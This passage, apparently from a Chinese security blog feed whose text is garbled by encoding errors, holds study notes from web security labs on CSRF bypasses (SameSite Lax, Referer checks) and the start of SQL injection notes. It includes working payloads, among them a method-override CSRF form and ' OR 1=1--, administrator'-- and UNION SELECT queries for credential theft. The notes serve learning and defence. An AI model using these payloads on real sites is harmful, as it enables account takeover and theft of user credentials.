<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;https://0a04001c0438b910819c76f500230087.web-security-academy.net/my-account/change-email&quot;</span> method=<span class="string">&quot;<span class="keyword">GET</span>&quot;</span>&gt;</span><br><span class="line">     &lt;input  type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;_method&quot;</span> value=<span class="string">&quot;<span class="keyword">POST</span>&quot;</span>/&gt;</span><br></pre></td></tr></table></figure></div>
<p>å…ˆå‘é€ä¸€ä¸ªGETè¯·æ±‚çš„è¡¨å•ï¼Œä½†æ˜¯ç”¨<code>_method</code>è¦†ç›–æˆPOST</p>
<p>æœ‰äº›æ—¶å€™è¦æ³¨æ„è§‚å¯Ÿç½‘é¡µä¸€äº›å°è„šæœ¬ï¼Œå°å·¥å…·ã€‚æ¯”å¦‚åœ¨è¿™ä¸ªç½‘é¡µç”¨æˆ·å‘é€ä¸€ä¸ªè¯„è®ºä¹‹åï¼Œåé‡å®šå‘åˆ°blogç•Œé¢ï¼Œè§‚å¯Ÿåˆ°æ˜¯è°ƒç”¨äº†ä¸€ä¸ªjs<br><img src="https://pic1.imgdb.cn/item/67c580f2d0e0a243d40ac717.png"><br>æ‰¾åˆ°è¿™ä¸ªjsçš„é€»è¾‘åªæ˜¯æ‹¼æ¥ä¹‹åå°±å¯ä»¥ç”¨è·¯å¾„é€ƒé€¸ï¼Œåƒè¿™æ ·<code>/post/comment/confirmation?postId=1/../../my-account</code><br>æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªç•Œé¢ç”Ÿæˆcsrf pocï¼Œï¼ˆå‰ææ˜¯å‘ç°ä¿®æ”¹é‚®ç®±ä¹Ÿå¯ä»¥é€šè¿‡getè¯·æ±‚å®ç°ï¼‰</p>
<p>æ— è®º æ˜¯åœ¨æµ‹è¯•å…¶ä»–äººçš„ç½‘ç«™è¿˜æ˜¯å°è¯•ä¿æŠ¤ è‡ªå·±çš„ç½‘ç«™ï¼Œè¯·åŠ¡å¿…è®°ä½ï¼Œå³ä½¿æ˜¯è·¨æºå‘å‡ºçš„è¯·æ±‚ä»ç„¶å¯ä»¥æ˜¯åŒä¸€ç«™ç‚¹çš„ã€‚</p>
<h4 id="ç”¨æ–°å‘å¸ƒçš„cookieç»•è¿‡-SameSite-Lax-é™åˆ¶"><a href="#ç”¨æ–°å‘å¸ƒçš„cookieç»•è¿‡-SameSite-Lax-é™åˆ¶" class="headerlink" title="ç”¨æ–°å‘å¸ƒçš„cookieç»•è¿‡ SameSite Lax é™åˆ¶"></a>ç”¨æ–°å‘å¸ƒçš„cookieç»•è¿‡ SameSite Lax é™åˆ¶</h4><p>å…·æœ‰ Lax SameSite é™åˆ¶çš„ Cookie é€šå¸¸ä¸ä¼šåœ¨ä»»ä½•è·¨ç«™ç‚¹ POST è¯·æ±‚ä¸­å‘é€ï¼Œä½†ä¹Ÿæœ‰ä¸€äº›ä¾‹å¤–ã€‚<br>å¦‚æœç½‘ç«™åœ¨è®¾ç½® Cookie æ—¶æœªåŒ…å« SameSite å±æ€§ï¼ŒChrome ä¼šé»˜è®¤è‡ªåŠ¨åº”ç”¨ Lax é™åˆ¶ã€‚ä½†æ˜¯ï¼Œä¸ºäº†é¿å…ç ´åå•ç‚¹ç™»å½• (SSO) æœºåˆ¶ï¼Œå®ƒå®é™…ä¸Šä¸ä¼šåœ¨é¡¶çº§ POST è¯·æ±‚çš„å‰ 120 ç§’å†…å¼ºåˆ¶æ‰§è¡Œè¿™äº›é™åˆ¶ã€‚å› æ­¤ï¼Œåœ¨ä¸¤åˆ†é’Ÿçš„æ—¶é—´å†…ï¼Œç”¨æˆ·å¯èƒ½å®¹æ˜“å—åˆ°è·¨ç«™ç‚¹æ”»å‡»ã€‚ï¼ˆæ­¤ä¸¤åˆ†é’Ÿçª—å£ä¸é€‚ç”¨äºä½¿ç”¨ SameSite&#x3D;Lax å±æ€§æ˜ç¡®è®¾ç½®çš„ cookieï¼‰<br>ä½†æ˜¯å°è¯•å°†æ”»å‡»æ—¶é—´å®‰æ’åœ¨è¿™ä¹ˆçŸ­çš„æ—¶é—´èŒƒå›´å†…æœ‰ç‚¹ä¸åˆ‡å®é™…ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœä½ èƒ½åœ¨ç½‘ç«™ä¸Šæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å¼ºåˆ¶å‘å—å®³è€…å‘å‡ºæ–°ä¼šè¯ cookie çš„å°å·¥å…·ï¼Œé‚£ä¹ˆä½ å¯ä»¥åœ¨è¿›è¡Œä¸»è¦æ”»å‡»ä¹‹å‰å…ˆåˆ·æ–°ä»–ä»¬çš„ cookieã€‚ä¾‹å¦‚ï¼Œå®ŒæˆåŸºäº OAuth çš„ç™»å½•æµç¨‹å¯èƒ½ä¼šå¯¼è‡´æ¯æ¬¡éƒ½äº§ç”Ÿæ–°ä¼šè¯ï¼Œå› ä¸º OAuth æœåŠ¡ä¸ä¸€å®šçŸ¥é“ç”¨æˆ·æ˜¯å¦ä»ç™»å½•åˆ°ç›®æ ‡ç½‘ç«™ã€‚<br>ä¸ºäº†è§¦å‘ cookie åˆ·æ–°è€Œæ— éœ€å—å®³è€…å†æ¬¡æ‰‹åŠ¨ç™»å½•ï¼Œ éœ€è¦ä½¿ç”¨é¡¶çº§å¯¼èˆªï¼Œä»¥ç¡®ä¿åŒ…å«ä¸å…¶å½“å‰ OAuth ä¼šè¯ç›¸å…³çš„ cookieã€‚è¿™å¸¦æ¥äº†é¢å¤–çš„æŒ‘æˆ˜ï¼Œå› ä¸º éœ€è¦å°†ç”¨æˆ·é‡å®šå‘å› çš„ç½‘ç«™ï¼Œä»¥ä¾¿å‘èµ· CSRF æ”»å‡»ã€‚<br>æˆ–è€…ï¼Œ å¯ä»¥ä»æ–°é€‰é¡¹å¡è§¦å‘ cookie åˆ·æ–°ï¼Œè¿™æ ·æµè§ˆå™¨å°±ä¸ä¼šåœ¨ èƒ½å¤Ÿå‘èµ·æœ€ç»ˆæ”»å‡»ä¹‹å‰ç¦»å¼€é¡µé¢ã€‚è¿™ç§æ–¹æ³•çš„ä¸€ä¸ªå°é—®é¢˜æ˜¯ï¼Œé™¤éé€šè¿‡æ‰‹åŠ¨äº¤äº’æ‰“å¼€å¼¹å‡ºé€‰é¡¹å¡ï¼Œå¦åˆ™æµè§ˆå™¨ä¼šé˜»æ­¢å®ƒä»¬ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹å¼¹å‡ºçª—å£å°†é»˜è®¤è¢«æµè§ˆå™¨é˜»æ­¢ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">window</span>.<span class="keyword">open</span>(<span class="string">&#x27;https://vulnerable-website.com/login/sso&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ å¯ä»¥å°†è¯­å¥åŒ…è£…åœ¨ onclick äº‹ä»¶å¤„ç†ç¨‹åºä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COFFEESCRIPT"><figure class="iseeu highlight /coffeescript"><table><tr><td class="code"><pre><span class="line">window.onclick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    window.open(<span class="string">&#x27;https://vulnerable-website.com/login/sso&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·ï¼Œä»…å½“ç”¨æˆ·ç‚¹å‡»é¡µé¢ä¸Šçš„æŸä¸ªä½ç½®æ—¶ï¼Œæ‰ä¼šè°ƒç”¨ window.open() æ–¹æ³•ã€‚</p>
<h3 id="åŸºäº-Referer-çš„éªŒè¯"><a href="#åŸºäº-Referer-çš„éªŒè¯" class="headerlink" title="åŸºäº Referer çš„éªŒè¯"></a>åŸºäº Referer çš„éªŒè¯</h3><p>ä¸€äº›åº”ç”¨ç¨‹åºåˆ©ç”¨ HTTP Referer æ ‡å¤´æ¥å°è¯•é˜²å¾¡ CSRF æ”»å‡»ï¼Œé€šå¸¸æ˜¯é€šè¿‡éªŒè¯è¯·æ±‚æ˜¯å¦æ¥è‡ªåº”ç”¨ç¨‹åºè‡ªå·±çš„åŸŸã€‚è¿™é€šå¸¸æ¯” CSRF tokenséªŒè¯æ•ˆæœå·®ã€‚</p>
<p>HTTP Referer æ ‡å¤´æ˜¯ä¸€ä¸ªå¯é€‰çš„è¯·æ±‚æ ‡å¤´ï¼Œå…¶ä¸­åŒ…å«é“¾æ¥åˆ°æ‰€è¯·æ±‚èµ„æºçš„ç½‘é¡µçš„ URLã€‚å®ƒé€šå¸¸åœ¨ç”¨æˆ·è§¦å‘ HTTP è¯·æ±‚æ—¶ç”±æµè§ˆå™¨è‡ªåŠ¨æ·»åŠ ï¼ŒåŒ…æ‹¬é€šè¿‡ç‚¹å‡»é“¾æ¥æˆ–æäº¤è¡¨å•ã€‚å­˜åœ¨å„ç§æ–¹æ³•å…è®¸é“¾æ¥é¡µé¢ä¿ç•™æˆ–ä¿®æ”¹ Referer æ ‡å¤´çš„å€¼ã€‚è¿™é€šå¸¸æ˜¯å‡ºäºéšç§åŸå› ã€‚</p>
<ul>
<li>å½“è¯·æ±‚ä¸­å­˜åœ¨ Referer æ ‡å¤´æ—¶ï¼ŒæŸäº›åº”ç”¨ç¨‹åºä¼šéªŒè¯è¯¥æ ‡å¤´ï¼Œä½†å¦‚æœçœç•¥è¯¥æ ‡å¤´ï¼Œåˆ™ä¼šè·³è¿‡éªŒè¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ç²¾å¿ƒè®¾è®¡ CSRF æ¼æ´ï¼Œè®©å—å®³ç”¨æˆ·çš„æµè§ˆå™¨åœ¨ç”Ÿæˆçš„è¯·æ±‚ä¸­ä¸¢å¼ƒ Referer æ ‡å¤´ã€‚æœ‰å¤šç§æ–¹æ³•å¯ä»¥å®ç°æ­¤ç›®çš„ï¼Œä½†æœ€ç®€å•çš„æ–¹æ³•æ˜¯åœ¨æ‰¿è½½ CSRF æ”»å‡»çš„ HTML é¡µé¢ä¸­ä½¿ç”¨ META æ ‡è®°ï¼š</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;never&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>æŸäº›åº”ç”¨ç¨‹åºä»¥ä¸€ç§å¯ä»¥è¢«ç»•è¿‡çš„ç®€å•æ–¹å¼éªŒè¯ Referer æ ‡å¤´ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºéªŒè¯ Referer ä¸­çš„åŸŸä»¥é¢„æœŸå€¼å¼€å¤´ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥å°†å…¶ä½œä¸ºè‡ªå·±åŸŸçš„å­åŸŸï¼š</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//attacker-website.com/csrf-attack?vulnerable-website.com</span></span><br></pre></td></tr></table></figure></div>
<p>è™½ç„¶ å¯ä»¥ä½¿ç”¨ Burp è¯†åˆ«æ­¤è¡Œä¸ºï¼Œä½†å½“ åœ¨æµè§ˆå™¨ä¸­æµ‹è¯•æ¦‚å¿µéªŒè¯æ—¶ï¼Œ ç»å¸¸ä¼šå‘ç°è¿™ç§æ–¹æ³•ä¸å†æœ‰æ•ˆã€‚ä¸ºäº†é™ä½ä»¥è¿™ç§æ–¹å¼æ³„éœ²æ•æ„Ÿæ•°æ®çš„é£é™©ï¼Œè®¸å¤šæµè§ˆå™¨ç°åœ¨é»˜è®¤ä» Referer æ ‡å¤´ä¸­åˆ é™¤æŸ¥è¯¢å­—ç¬¦ä¸²ã€‚</p>
<p>å› ä¸ºè®¸å¤šæµè§ˆå™¨ç°åœ¨é»˜è®¤ä» Referer æ ‡å¤´ä¸­åˆ é™¤æŸ¥è¯¢å­—ç¬¦ä¸²ä½œä¸ºå®‰å…¨æªæ–½ã€‚è¦è¦†ç›–æ­¤è¡Œä¸ºå¹¶ç¡®ä¿è¯·æ±‚ä¸­åŒ…å«å®Œæ•´çš„ URLï¼Œè¯·è¿”å›æ¼æ´æœåŠ¡å™¨å¹¶å°†ä»¥ä¸‹æ ‡å¤´æ·»åŠ åˆ° â€œHeadâ€ éƒ¨åˆ†ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CMAKE"><figure class="iseeu highlight /cmake"><table><tr><td class="code"><pre><span class="line">Referrer-<span class="keyword">Policy</span>: unsafe-url</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>æ¼æ´</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ç¬”è®°</tag>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ¼æ´å­¦ä¹ ç¬”è®°</title>
    <url>/posts/21833.html</url>
    <content><![CDATA[<p>bpå®éªŒå®¤SQLæ¼æ´å­¦ä¹ ç¬”è®° (ç¤ºä¾‹ä½¿ç”¨çš„æ˜¯Oracleæ•°æ®åº“)</p>
<span id="more"></span>
<h2 id="ä»€ä¹ˆæ˜¯SQLæ³¨å…¥-sqli"><a href="#ä»€ä¹ˆæ˜¯SQLæ³¨å…¥-sqli" class="headerlink" title="ä»€ä¹ˆæ˜¯SQLæ³¨å…¥(sqli)"></a>ä»€ä¹ˆæ˜¯SQLæ³¨å…¥(sqli)</h2><p>sqlæ³¨å…¥æŒ‡çš„æ˜¯é’ˆå¯¹æœåŠ¡å™¨çš„æ•°æ®åº“è¿›è¡Œæ”»å‡»çš„ä¸€ç§æ‰‹æ®µï¼Œé€šè¿‡å¯¹æ•°æ®åº“çš„å¹²æ‰°ï¼Œè®©æ”»å‡»è€…å¯ä»¥çœ‹åˆ°ä¸€äº›æ•æ„Ÿçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¯†ç ï¼Œä¿¡ç”¨å¡ï¼Œä¸ªäººä¿¡æ¯ç­‰ï¼Œåœ¨å¾ˆå¤šæƒ…å†µä¸‹è¿˜å¯ä»¥ä¿®æ”¹å’Œåˆ é™¤æ•°æ®ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—è¿›å…¥ç»„ç»‡ç³»ç»Ÿçš„æŒä¹…åé—¨ï¼Œä»è€Œå¯¼è‡´é•¿æœŸå…¥ä¾µï¼Œå¹¶ä¸”å¯èƒ½åœ¨å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…éƒ½ä¸ä¼šè¢«å‘ç°ã€‚</p>
<h2 id="å¦‚ä½•æ£€æµ‹"><a href="#å¦‚ä½•æ£€æµ‹" class="headerlink" title="å¦‚ä½•æ£€æµ‹"></a>å¦‚ä½•æ£€æµ‹</h2><p>å¯ä»¥ä½¿ç”¨æ‰‹åŠ¨æ£€æµ‹sqlæ¼æ´ï¼Œé€šå¸¸å¯ä»¥åˆ©ç”¨ä¸€ä¸‹å‡ ç§æ–¹å¼ï¼š</p>
<ul>
<li>å•å¼•å·<code>&#39;</code>æŸ¥æ‰¾å¼‚å¸¸</li>
<li>é€šè¿‡sqlçš„åŸºç¡€è¯­æ³•ï¼Œåœ¨å…¥å£ç‚¹å¯¹ä¸åŒçš„å€¼åšå‡ºè¯„ä¼°ï¼Œæ‰¾å‡ºä¸åŒ</li>
<li>å¸ƒå°”æ¡ä»¶ï¼Œæ¯”å¦‚<code>OR 1=1``OR 1=2</code>åˆ¤æ–­æœ‰ä»€ä¹ˆä¸åŒ</li>
<li>é€šè¿‡æ—¶é—´åˆ¤æ–­ï¼Œé€šè¿‡è§¦å‘sqlæ—¶é—´å»¶è¿Ÿçš„payloadæ¥æ‰¾åˆ°å“åº”æ—¶é—´çš„å·®å¼‚</li>
<li>é€šè¿‡OASTå¤–å¸¦ç½‘ç»œï¼Œçœ‹æ˜¯å¦å¯ä»¥ä¸å¤–éƒ¨ç½‘ç»œè¿›è¡Œäº¤äº’</li>
</ul>
<p>å¤§å¤šæ•°çš„SQLæ¼æ´éƒ½å‘ç”Ÿåœ¨<code>WHERE</code> å’Œ <code>SELECT</code>è¯­å¥<br>ä½†æ˜¯ï¼ŒSQL æ³¨å…¥æ¼æ´å¯èƒ½å‘ç”Ÿåœ¨æŸ¥è¯¢ä¸­çš„ä»»ä½•ä½ç½®ï¼Œä»¥åŠä¸åŒçš„æŸ¥è¯¢ç±»å‹ä¸­ã€‚SQL æ³¨å…¥å‡ºç°çš„å…¶ä»–ä¸€äº›å¸¸è§ä½ç½®åŒ…æ‹¬ï¼š</p>
<ul>
<li>åœ¨UPDATEè¯­å¥ä¸­ï¼Œåœ¨æ›´æ–°çš„å€¼æˆ–WHEREå­å¥å†…ã€‚</li>
<li>åœ¨INSERTè¯­å¥ä¸­ï¼Œåœ¨æ’å…¥çš„å€¼å†…ã€‚</li>
<li>åœ¨SELECTè¯­å¥ä¸­ï¼Œåœ¨è¡¨æˆ–åˆ—åç§°å†…ã€‚</li>
<li>åœ¨SELECTè¯­å¥ä¸­ï¼Œåœ¨ORDER BYå­å¥å†…ã€‚</li>
</ul>
<h2 id="SQLæ³¨å…¥ç¤ºä¾‹"><a href="#SQLæ³¨å…¥ç¤ºä¾‹" class="headerlink" title="SQLæ³¨å…¥ç¤ºä¾‹"></a>SQLæ³¨å…¥ç¤ºä¾‹</h2><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„SQLæ³¨å…¥ç¤ºä¾‹<br>åŒ…æ‹¬ æ£€ç´¢éšè—æ•°æ®  ä¿®æ”¹åº”ç”¨é€»è¾‘åˆ¤æ–­ï¼ˆé€šè¿‡æŸ¥è¯¢è¯­å¥æ¥å¹²æ‰°ç¨‹åºçš„é€»è¾‘ï¼‰unionæ”»å‡»ï¼ˆæŸ¥è¯¢ä¸åŒçš„æ•°æ®è¡¨ï¼‰  ç›²sqlï¼ˆsqlæ²¡æœ‰å›æ˜¾ï¼‰</p>
<h3 id="æ£€ç´¢éšè—æ•°æ®"><a href="#æ£€ç´¢éšè—æ•°æ®" class="headerlink" title="æ£€ç´¢éšè—æ•°æ®"></a>æ£€ç´¢éšè—æ•°æ®</h3><p>æ¯”å¦‚ç°åœ¨ä½ è¦å¯¹ä¸€ä¸ªå•†å“çš„ç§ç±»è¿›è¡ŒæŸ¥è¯¢ï¼Œä½ å‘é€çš„è¯·æ±‚å¤§æ¦‚æ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//insecure-website.com/products?category=Gifts</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™å°±ä¼šè®©ç¨‹åºæ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category = <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>è¿™å°±è®©æ•°æ®è¿”å›<br><code>*</code> : æ‰€æœ‰æ•°æ®  <code>products</code> : æ¥è‡ªè¿™ä¸ªè¡¨é‡Œçš„å†…å®¹ <code>category = &#39;Gifts&#39;</code> : æŸ¥è¯¢ç§ç±»ä¸ºGiftsçš„æ•°æ® <code>released = 1</code> : å¯èƒ½æ˜¯å¯¹ç”¨æˆ·æŸ¥è¯¢çš„é™åˆ¶ï¼Œæ¯”å¦‚æœªå‘å”®çš„äº§å“released&#x3D;0</p>
<p>å¦‚æœè¿™ä¸ªç½‘ç«™æ²¡æœ‰è¿›è¡Œä»»ä½•çš„sqlæ³¨å…¥é˜²å¾¡,å°±ä¼šé€ æˆä»¥ä¸‹æ”»å‡»</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OXYGENE"><figure class="iseeu highlight /oxygene"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//insecure-website.com/products?category=Gifts&#x27;--</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category = <span class="string">&#x27;Gifts&#x27;</span>--<span class="string">&#x27; AND released = 1</span></span><br></pre></td></tr></table></figure></div>
<p>å½“è¿™ä¸ªæŸ¥è¯¢è¯­å¥è¢«æ‹¼æ¥ä¸Šå»æ—¶ï¼Œ<code>&#39;</code>ä¼šå…ˆé—­åˆå¼•å·ï¼Œ<code>--</code>æ˜¯sqlçš„æ³¨é‡Šç¬¦ï¼Œå°±ä¼šæŠŠåé¢çš„<code>AND released = 1</code>æ³¨é‡Šæ‰ï¼Œè¿™æ ·å­ç”¨æˆ·å°±å¯ä»¥è®¿é—®åˆ°æ‰€æœ‰çš„å•†å“ï¼ŒåŒ…æ‹¬æ²¡æœ‰å‘å¸ƒçš„ï¼Œè¿˜å¯ä»¥æŸ¥è¯¢æ‰€æœ‰ç±»å‹çš„å•†å“</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://insecure-website.com/products?category=Gifts&#x27;+OR+<span class="number">1</span>=<span class="number">1</span>--</span><br></pre></td></tr></table></figure></div>
<p>ä¿®æ”¹åçš„æŸ¥è¯¢å°†è¿”å›categoryä¸ºGiftsæˆ–1ç­‰äº1æ‰€æœ‰é¡¹ç›®ã€‚ç”±äº1&#x3D;1å§‹ç»ˆä¸ºçœŸï¼Œå› æ­¤æŸ¥è¯¢å°†è¿”å›æ‰€æœ‰é¡¹ç›®ã€‚<br>ä½†æ˜¯è¦æ³¨æ„ï¼š<br>å°†æ¡ä»¶OR 1&#x3D;1æ³¨å…¥ SQL æŸ¥è¯¢æ—¶è¦å°å¿ƒè°¨æ…ã€‚å³ä½¿åœ¨ æ³¨å…¥çš„ä¸Šä¸‹æ–‡ä¸­çœ‹èµ·æ¥æ— å®³ï¼Œåº”ç”¨ç¨‹åºåœ¨å¤šä¸ªä¸åŒçš„æŸ¥è¯¢ä¸­ä½¿ç”¨æ¥è‡ªå•ä¸ªè¯·æ±‚çš„æ•°æ®ä¹Ÿå¾ˆå¸¸è§ã€‚<br>ä¾‹å¦‚ï¼Œå¦‚æœ çš„æ¡ä»¶åˆ°è¾¾UPDATEæˆ–DELETEè¯­å¥ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ„å¤–çš„æ•°æ®ä¸¢å¤±ã€‚</p>
<h3 id="æ”¹å˜åº”ç”¨ç¨‹åºçš„é€»è¾‘"><a href="#æ”¹å˜åº”ç”¨ç¨‹åºçš„é€»è¾‘" class="headerlink" title="æ”¹å˜åº”ç”¨ç¨‹åºçš„é€»è¾‘"></a>æ”¹å˜åº”ç”¨ç¨‹åºçš„é€»è¾‘</h3><p>æ¯”å¦‚ä¸€ä¸ªç¨‹åºæ˜¯è®©ç”¨æˆ·é€šè¿‡ç”¨æˆ·åå’Œå¯†ç ç™»å½•ï¼Œå¦‚æœç”¨æˆ·æäº¤ç”¨æˆ·åwienerå’Œå¯†ç bluecheese ï¼Œåˆ™åº”ç”¨ç¨‹åºé€šè¿‡æ‰§è¡Œä»¥ä¸‹ SQL æŸ¥è¯¢æ¥æ£€æŸ¥å‡­æ®ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">&#x27;wiener&#x27;</span> <span class="keyword">AND</span> <span class="keyword">password</span> = <span class="string">&#x27;bluecheese&#x27;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä»¥ä»»ä½•ç”¨æˆ·èº«ä»½ç™»å½•ï¼Œè€Œæ— éœ€å¯†ç ã€‚ä»–ä»¬å¯ä»¥ä½¿ç”¨ SQL æ³¨é‡Šåºåˆ—â€“ä»æŸ¥è¯¢çš„WHEREå­å¥ä¸­åˆ é™¤å¯†ç æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œæäº¤ç”¨æˆ·åadministratorâ€™â€“å’Œç©ºç™½å¯†ç ä¼šå¯¼è‡´ä»¥ä¸‹æŸ¥è¯¢ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">&#x27;administrator&#x27;</span>--<span class="string">&#x27; AND password = &#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>


<h3 id="ä»å…¶ä»–æ•°æ®è¡¨æ£€ç´¢ä¿¡æ¯-UNIONæ”»å‡»"><a href="#ä»å…¶ä»–æ•°æ®è¡¨æ£€ç´¢ä¿¡æ¯-UNIONæ”»å‡»" class="headerlink" title="ä»å…¶ä»–æ•°æ®è¡¨æ£€ç´¢ä¿¡æ¯ (UNIONæ”»å‡»)"></a>ä»å…¶ä»–æ•°æ®è¡¨æ£€ç´¢ä¿¡æ¯ (UNIONæ”»å‡»)</h3><p>å¦‚æœåº”ç”¨ç¨‹åºä»¥ SQL æŸ¥è¯¢ç»“æœä½œä¸ºå“åº”ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ SQL æ³¨å…¥æ¼æ´ä»æ•°æ®åº“å†…çš„å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®<br>åˆ©ç”¨<code>UNION</code>å…³é”®å­—å¯ä»¥æ‰§è¡Œé¢å¤–çš„æŸ¥è¯¢<br>ä¾‹å¦‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºæ‰§è¡ŒåŒ…å«ç”¨æˆ·è¾“å…¥Giftsçš„ä»¥ä¸‹æŸ¥è¯¢ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="type">name</span>, description <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category = <span class="string">&#x27;Gifts&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>æ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»¥ä¸‹çš„æŸ¥è¯¢</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> users--</span><br></pre></td></tr></table></figure>
<p>è¿™ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºè¿”å›æ‰€æœ‰ç”¨æˆ·åå’Œå¯†ç ä»¥åŠäº§å“åç§°å’Œæè¿°ã€‚</p>
<p>ä¸ºäº†ä½¿UNIONæŸ¥è¯¢æ­£å¸¸å·¥ä½œï¼Œå¿…é¡»æ»¡è¶³ä¸¤ä¸ªå…³é”®è¦æ±‚ï¼š</p>
<ul>
<li>å„ä¸ªæŸ¥è¯¢å¿…é¡»è¿”å›ç›¸åŒæ•°é‡çš„åˆ—ã€‚</li>
<li>æ¯åˆ—ä¸­çš„æ•°æ®ç±»å‹å¿…é¡»åœ¨å„ä¸ªæŸ¥è¯¢ä¹‹é—´å…¼å®¹ã€‚<br>è¦æ‰§è¡Œ SQL æ³¨å…¥ UNION æ”»å‡»ï¼Œè¦ç¡®ä¿æ”»å‡»æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªè¦æ±‚</li>
<li>åŸå§‹æŸ¥è¯¢è¿”å›äº†å¤šå°‘åˆ—ã€‚</li>
<li>ä»åŸå§‹æŸ¥è¯¢è¿”å›çš„å“ªäº›åˆ—å…·æœ‰åˆé€‚çš„æ•°æ®ç±»å‹æ¥ä¿å­˜æ³¨å…¥æŸ¥è¯¢çš„ç»“æœã€‚</li>
</ul>
